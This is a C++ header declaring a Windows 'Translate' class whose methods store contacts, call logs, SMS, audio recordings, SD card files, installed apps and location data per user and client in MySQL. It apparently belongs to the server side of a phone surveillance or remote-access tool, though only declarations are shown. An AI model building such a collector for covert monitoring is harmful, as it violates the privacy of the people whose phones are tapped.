#pragma once

#include <iostream>
#include <windows.h>
#include "Base64.h"
#include "FileOperator.h"
#include "mysqlOper.h"

using namespace std;

string newformattime(string str);

string timestamp2calender(time_t t);

DWORD str2time(char* str);

class Translate {
public:
	Translate();
	~Translate();
	int writeAddress(char* data, int size, string username, string clientname);
	int writeCall(char* data, int size, string username, string clientname);
	int writeSdcard(char* data, int size, string username, string clientname, string filepath, string filename);
	int writeAudio(char* data, int size, string username, string clientname, string filepath);
	int writeApp(char* data, int size, string username, string clientname);
	int writeSys(char* data, int size, string username, string clientname);
	int writeSms(char* data, int size, string username, string clientname);
	int writeLocation(char* data, int size, string username, string clientname);
	int process(char* szdir, string username, string clientname);
	static void __stdcall mainLoop(Translate* cls);
};